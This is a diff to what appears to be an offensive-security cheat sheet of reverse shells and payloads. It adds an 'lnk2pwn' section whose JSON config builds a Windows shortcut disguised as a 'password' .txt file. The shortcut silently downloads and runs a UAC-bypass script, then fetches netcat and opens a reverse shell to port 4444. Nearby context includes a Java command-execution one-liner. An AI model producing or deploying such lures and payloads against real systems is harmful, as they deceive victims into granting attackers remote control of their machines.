@@ -21,6 +21,7 @@
 - [JAVA Reverse Shell](#java-reverse-shell)
 - [JavaScript Keylogger](#javascript-keylogger)
 - [JDWP](#jdwp)
+- [lnk2pwn](#lnk2pwn)
 - [Lua Reverse Shell](#lua-reverse-shell)
 - [Macros](#macros)
 - [marco_pack](#macro-pack)
@@ -389,6 +390,33 @@ window.setInterval(function(){
 
 ```c
 $ print new java.lang.String(new java.io.BufferedReader(new java.io.InputStreamReader(new java.lang.Runtime().exec("whoami").getInputStream())).readLine())
+```
+
+## lnk2pwn
+
+> https://github.com/it-gorillaz/lnk2pwn
+
+> https://gist.github.com/tommelo/6852d303498403f80e889f3f7a3e7105#file-config-json
+
+```c
+{
+    "shortcut": {
+        "target_path": "C:\\Windows\\System32\\cmd.exe",
+        "working_dir": "C:\\Windows\\System32",
+        "arguments": "/c powershell.exe iwr -outf %tmp%\\p.vbs http://127.0.0.1/uac_bypass.vbs & %tmp%\\p.vbs",
+        "icon_path": "C:\\Windows\\System32\\notepad.exe",
+        "icon_index": null,
+        "window_style": "MINIMIZED",
+        "description": "TRUST ME",
+        "fake_extension": ".txt",
+        "file_name_prefix": "password"
+    },
+
+    "elevated_uac": {
+        "file_name": "uac_bypass.vbs",
+        "cmd": "cmd.exe /c powershell.exe -nop -w hidden iwr -outf C:\\Windows\\System32\\nc.exe http://127.0.0.1/nc.exe & C:\\Windows\\System32\\nc.exe 127.0.0.1 4444 -e cmd.exe"
+    }
+}
 ```
 
 ## Lua Reverse Shell
